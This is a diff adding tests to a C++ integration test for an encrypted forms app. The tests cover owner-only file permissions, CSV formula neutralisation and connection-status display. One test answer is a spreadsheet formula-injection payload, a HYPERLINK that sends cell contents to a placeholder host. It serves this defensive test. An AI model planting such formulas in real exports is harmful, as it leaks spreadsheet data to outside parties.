@@ -154,6 +154,33 @@ int main(int argc, char** argv) {
     json csvB = B->call(B->core->exportCsv(fid));
     CHECK(!csvB.value("ok", true), "non-creator cannot export CSV");
 
+    // ── review 2026-10-22: private files, CSV formulas, status after connect ──────
+    {
+        namespace fs = std::filesystem;
+        auto mode = [](const std::string& p) { std::error_code ec; return (int)fs::status(p, ec).permissions() & 0777; };
+        CHECK(mode(A->dir) == 0700, "the data dir is owner-only (0700)");
+        CHECK(mode(A->dir + "/identity.json") == 0600, "identity.json (the private key) is owner-only (0600)");
+        CHECK(mode(B->dir + "/my_answers.json") == 0600, "the respondent's own answers are owner-only (0600)");
+        json fx = A->call(A->core->createForm(json({{"title", "CSV"}, {"questions", json::array({
+            {{"id", "t"}, {"type", "textarea"}, {"text", "Say"}, {"required", true}},
+            {{"id", "n"}, {"type", "number"}, {"text", "How many"}, {"required", false}, {"min", -10}, {"max", 10}}})}}).dump()));
+        std::string fxid = fx.value("formId", "");
+        CHECK(waitUntil([&] { return hasForm(*C, fxid); }, 3000), "CSV form reaches C");
+        json ans = json::array({{{"questionId", "t"}, {"value", "=HYPERLINK(\"https://example.invalid/?\"&A1,\"x\")"}}, {{"questionId", "n"}, {"value", -5}}});
+        CHECK(C->call(C->core->submitResponse(fxid, ans.dump())).value("ok", false), "C answers with a formula");
+        CHECK(waitUntil([&] { return responsesOf(*A, fxid).size() == 1; }, 3000), "A decrypts C's formula answer");
+        std::string cx = A->call(A->core->exportCsv(fxid)).value("csv", "");
+        CHECK(cx.find("\"'=HYPERLINK") != std::string::npos && cx.find(",=HYPERLINK") == std::string::npos && cx.find(",\"=HYPERLINK") == std::string::npos,
+              "CSV neutralises a formula answer with a leading ' (" + cx.substr(cx.find('\n') + 1, 120) + ")");
+        CHECK(cx.find(",-5") != std::string::npos, "...but a negative number stays a number");
+        // a delivery node that stops answering after the first connect must show, and recovery must catch up
+        auto st = [&] { return A->core->status(); };
+        A->node->onStatus("Transport stalled: no answer for 30 s");
+        CHECK(waitUntil([&] { return st().rfind("Transport stalled", 0) == 0; }, 2000), "a stall after the first connect is shown (" + st() + ")");
+        A->node->onStatus("Connected");
+        CHECK(waitUntil([&] { return st() == "Connected"; }, 2000), "...and recovery shows Connected again");
+    }
+
     // ── Scenario C (privacy) ───────────────────────────────────────────────────
     std::printf("scenario C (privacy):\n");
     json sC = C->snap();
